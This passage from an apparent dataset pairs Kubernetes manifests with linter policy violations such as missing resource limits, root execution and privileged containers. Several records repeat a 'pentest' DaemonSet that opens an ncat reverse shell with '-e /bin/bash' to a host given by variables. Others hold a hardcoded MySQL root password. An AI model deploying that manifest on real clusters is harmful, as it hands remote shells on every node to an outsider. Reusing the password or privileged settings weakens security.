    "manifest_path": "data/manifests/the_stack_sample/sample_2834.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostnetwork-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostnetwork-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hostnetwork-revshell-daemonset\" is using an invalid container image, \"raesene/ncat\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7710",
    "manifest_path": "data/manifests/the_stack_sample/sample_2834.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostnetwork-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostnetwork-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hostnetwork-revshell-daemonset\" does not have a read-only root file system"
  },
  {
    "id": "7711",
    "manifest_path": "data/manifests/the_stack_sample/sample_2834.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostnetwork-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostnetwork-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hostnetwork-revshell-daemonset\" is not set to runAsNonRoot"
  },
  {
    "id": "7712",
    "manifest_path": "data/manifests/the_stack_sample/sample_2834.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostnetwork-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostnetwork-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hostnetwork-revshell-daemonset\" has cpu request 0"
  },
  {
    "id": "7713",
    "manifest_path": "data/manifests/the_stack_sample/sample_2834.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostnetwork-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostnetwork-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hostnetwork-revshell-daemonset\" has memory limit 0"
  },
  {
    "id": "7714",
    "manifest_path": "data/manifests/the_stack_sample/sample_2835.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ratings\n  labels:\n    app: ratings\n    service: ratings\nspec:\n  ports:\n  - port: 9080\n    name: http\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "7715",
    "manifest_path": "data/manifests/the_stack_sample/sample_2836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: database\n        image: biarms/mysql\n        resources:\n          requests:\n            memory: 2Gi\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: raspberry\n        livenessProbe:\n          tcpSocket:\n            port: 3306\n        ports:\n        - containerPort: 3306\n      volumes:\n      - name: database\n        persistentVolumeClaim:\n          claimName: mysql-claim\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"database\" is using an invalid container image, \"biarms/mysql\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7716",
    "manifest_path": "data/manifests/the_stack_sample/sample_2836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: database\n        image: biarms/mysql\n        resources:\n          requests:\n            memory: 2Gi\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: raspberry\n        livenessProbe:\n          tcpSocket:\n            port: 3306\n        ports:\n        - containerPort: 3306\n      volumes:\n      - name: database\n        persistentVolumeClaim:\n          claimName: mysql-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"database\" does not have a read-only root file system"
  },
  {
    "id": "7717",
    "manifest_path": "data/manifests/the_stack_sample/sample_2836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: database\n        image: biarms/mysql\n        resources:\n          requests:\n            memory: 2Gi\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: raspberry\n        livenessProbe:\n          tcpSocket:\n            port: 3306\n        ports:\n        - containerPort: 3306\n      volumes:\n      - name: database\n        persistentVolumeClaim:\n          claimName: mysql-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"database\" is not set to runAsNonRoot"
  },
  {
    "id": "7718",
    "manifest_path": "data/manifests/the_stack_sample/sample_2836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: database\n        image: biarms/mysql\n        resources:\n          requests:\n            memory: 2Gi\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: raspberry\n        livenessProbe:\n          tcpSocket:\n            port: 3306\n        ports:\n        - containerPort: 3306\n      volumes:\n      - name: database\n        persistentVolumeClaim:\n          claimName: mysql-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"database\" has cpu request 0"
  },
  {
    "id": "7719",
    "manifest_path": "data/manifests/the_stack_sample/sample_2836.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: database\n        image: biarms/mysql\n        resources:\n          requests:\n            memory: 2Gi\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: raspberry\n        livenessProbe:\n          tcpSocket:\n            port: 3306\n        ports:\n        - containerPort: 3306\n      volumes:\n      - name: database\n        persistentVolumeClaim:\n          claimName: mysql-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"database\" has memory limit 0"
  },
  {
    "id": "7720",
    "manifest_path": "data/manifests/the_stack_sample/sample_2837.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: elasticsearch-head-svc\n  namespace: elasticsearch-head\n  labels:\n    run: nginx\n    k8s-app: elasticsearch-head\n    version: v5.6.2\n    kubernetes.io/cluster-service: 'true'\n    addonmanager.kubernetes.io/mode: Reconcile\n    boss-part-of: efk\nspec:\n  ports:\n  - port: 80\n    targetPort: 9100\n    protocol: TCP\n    name: http\n  selector:\n    run: nginx\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[run:nginx])"
  },
  {
    "id": "7721",
    "manifest_path": "data/manifests/the_stack_sample/sample_2840.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: grafana\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - image: grafana/grafana:6.4.3\n        name: grafana\n        ports:\n        - containerPort: 3001\n          name: http\n        readinessProbe:\n          httpGet:\n            path: /api/health\n            port: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"grafana\" does not have a read-only root file system"
  },
  {
    "id": "7722",
    "manifest_path": "data/manifests/the_stack_sample/sample_2840.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: grafana\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - image: grafana/grafana:6.4.3\n        name: grafana\n        ports:\n        - containerPort: 3001\n          name: http\n        readinessProbe:\n          httpGet:\n            path: /api/health\n            port: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"grafana\" is not set to runAsNonRoot"
  },
  {
    "id": "7723",
    "manifest_path": "data/manifests/the_stack_sample/sample_2842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aqua-db\n  labels:\n    app: aqua-db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: aqua-db\n  template:\n    metadata:\n      labels:\n        app: aqua-db\n      name: aqua-db\n    spec:\n      serviceAccount: aqua-sa\n      containers:\n      - name: aqua-db\n        image: registry.aquasec.com/database:5.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: aqua-db\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgres-db\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n      volumes:\n      - name: postgres-db\n        persistentVolumeClaim:\n          claimName: aqua-db-pvc\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (aqua-sa), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "7724",
    "manifest_path": "data/manifests/the_stack_sample/sample_2842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aqua-db\n  labels:\n    app: aqua-db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: aqua-db\n  template:\n    metadata:\n      labels:\n        app: aqua-db\n      name: aqua-db\n    spec:\n      serviceAccount: aqua-sa\n      containers:\n      - name: aqua-db\n        image: registry.aquasec.com/database:5.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: aqua-db\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgres-db\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n      volumes:\n      - name: postgres-db\n        persistentVolumeClaim:\n          claimName: aqua-db-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"aqua-db\" does not have a read-only root file system"
  },
  {
    "id": "7725",
    "manifest_path": "data/manifests/the_stack_sample/sample_2842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aqua-db\n  labels:\n    app: aqua-db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: aqua-db\n  template:\n    metadata:\n      labels:\n        app: aqua-db\n      name: aqua-db\n    spec:\n      serviceAccount: aqua-sa\n      containers:\n      - name: aqua-db\n        image: registry.aquasec.com/database:5.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: aqua-db\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgres-db\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n      volumes:\n      - name: postgres-db\n        persistentVolumeClaim:\n          claimName: aqua-db-pvc\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"aqua-sa\" not found"
  },
  {
    "id": "7726",
    "manifest_path": "data/manifests/the_stack_sample/sample_2842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aqua-db\n  labels:\n    app: aqua-db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: aqua-db\n  template:\n    metadata:\n      labels:\n        app: aqua-db\n      name: aqua-db\n    spec:\n      serviceAccount: aqua-sa\n      containers:\n      - name: aqua-db\n        image: registry.aquasec.com/database:5.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: aqua-db\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgres-db\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n      volumes:\n      - name: postgres-db\n        persistentVolumeClaim:\n          claimName: aqua-db-pvc\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"aqua-db\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "7727",
    "manifest_path": "data/manifests/the_stack_sample/sample_2842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aqua-db\n  labels:\n    app: aqua-db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: aqua-db\n  template:\n    metadata:\n      labels:\n        app: aqua-db\n      name: aqua-db\n    spec:\n      serviceAccount: aqua-sa\n      containers:\n      - name: aqua-db\n        image: registry.aquasec.com/database:5.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: aqua-db\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgres-db\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n      volumes:\n      - name: postgres-db\n        persistentVolumeClaim:\n          claimName: aqua-db-pvc\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"aqua-db\" is privileged"
  },
  {
    "id": "7728",
    "manifest_path": "data/manifests/the_stack_sample/sample_2842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aqua-db\n  labels:\n    app: aqua-db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: aqua-db\n  template:\n    metadata:\n      labels:\n        app: aqua-db\n      name: aqua-db\n    spec:\n      serviceAccount: aqua-sa\n      containers:\n      - name: aqua-db\n        image: registry.aquasec.com/database:5.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: aqua-db\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgres-db\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n      volumes:\n      - name: postgres-db\n        persistentVolumeClaim:\n          claimName: aqua-db-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"aqua-db\" is not set to runAsNonRoot"
  },
  {
    "id": "7729",
    "manifest_path": "data/manifests/the_stack_sample/sample_2842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aqua-db\n  labels:\n    app: aqua-db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: aqua-db\n  template:\n    metadata:\n      labels:\n        app: aqua-db\n      name: aqua-db\n    spec:\n      serviceAccount: aqua-sa\n      containers:\n      - name: aqua-db\n        image: registry.aquasec.com/database:5.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: aqua-db\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgres-db\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n      volumes:\n      - name: postgres-db\n        persistentVolumeClaim:\n          claimName: aqua-db-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"aqua-db\" has cpu request 0"
  },
  {
    "id": "7730",
    "manifest_path": "data/manifests/the_stack_sample/sample_2842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aqua-db\n  labels:\n    app: aqua-db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: aqua-db\n  template:\n    metadata:\n      labels:\n        app: aqua-db\n      name: aqua-db\n    spec:\n      serviceAccount: aqua-sa\n      containers:\n      - name: aqua-db\n        image: registry.aquasec.com/database:5.0\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: aqua-db\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgres-db\n        ports:\n        - containerPort: 5432\n          protocol: TCP\n      volumes:\n      - name: postgres-db\n        persistentVolumeClaim:\n          claimName: aqua-db-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"aqua-db\" has memory limit 0"
  },
  {
    "id": "7731",
    "manifest_path": "data/manifests/the_stack_sample/sample_2843.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210608-953d79c16d\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "7732",
    "manifest_path": "data/manifests/the_stack_sample/sample_2843.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210608-953d79c16d\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"statusreconciler\" not found"
  },
  {
    "id": "7733",
    "manifest_path": "data/manifests/the_stack_sample/sample_2843.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210608-953d79c16d\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "7734",
    "manifest_path": "data/manifests/the_stack_sample/sample_2843.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210608-953d79c16d\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "7735",
    "manifest_path": "data/manifests/the_stack_sample/sample_2843.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210608-953d79c16d\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "7736",
    "manifest_path": "data/manifests/the_stack_sample/sample_2844.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n    product: ibm-spectrum-scale-csi\n    release: ibm-spectrum-scale-csi-operator\n  name: csi-operator\n  namespace: ibm-spectrum-scale-csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n  template:\n    metadata:\n      annotations:\n        productID: ibm-spectrum-scale-csi-operator\n        productName: IBM Spectrum Scale CSI Operator\n        productVersion: 2.4.0\n      labels:\n        app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n        name: ibm-spectrum-scale-csi-operator\n        product: ibm-spectrum-scale-csi\n        release: ibm-spectrum-scale-csi-operator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: kubernetes.io/arch\n                operator: Exists\n      containers:\n      - name: operator\n        args:\n        - --metrics-addr=0.0.0.0:8383\n        - --enable-leader-election\n        - --leader-election-id=ibm-spectrum-scale-csi-operator\n        env:\n        - name: SHORTNAME_NODE_MAPPING\n          value: 'yes'\n        - name: MAX_CONCURRENT_RECONCILES_CSISCALEOPERATOR_CSI_IBM_COM\n          value: '1'\n        - name: MAX_CONCURRENT_RECONCILES_SECRET_\n          value: '1'\n        - name: ANSIBLE_DEBUG_LOGS\n          value: 'False'\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CSI_DRIVER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/ibm-spectrum-scale-csi-driver@sha256:4d8c41138f2fddac351f82db19c32fe5ad1282e7886f78fe2669f0c30ea5badb\n        - name: CSI_SNAPSHOTTER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-snapshotter@sha256:818f35653f2e214db81d655063e81995de9073328a3430498624c140881026a3\n        - name: CSI_ATTACHER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-attacher@sha256:80dec81b679a733fda448be92a2331150d99095947d04003ecff3dbd7f2a476a\n        - name: CSI_PROVISIONER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-provisioner@sha256:6477988532358148d2e98f7c747db4e9250bbc7ad2664bf666348abf9ee1f5aa\n        - name: CSI_LIVENESSPROBE_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/livenessprobe@sha256:529be2c9770add0cdd0c989115222ea9fc1be430c11095eb9f6dafcf98a36e2b\n        - name: CSI_NODE_REGISTRAR_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-node-driver-registrar@sha256:f9bcee63734b7b01555ee8fc8fb01ac2922478b2c8934bf8d468dd2916edc405\n        - name: CSI_RESIZER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-resizer@sha256:6e0546563b18872b0aa0cad7255a26bb9a87cb879b7fc3e2383c867ef4f706fb\n        image: icr.io/cpopen/ibm-spectrum-scale-csi-operator@sha256:38751e2b7a4624e588747ed427c2c2146bee320bab74b0bb288f38c2c5d2bddd\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          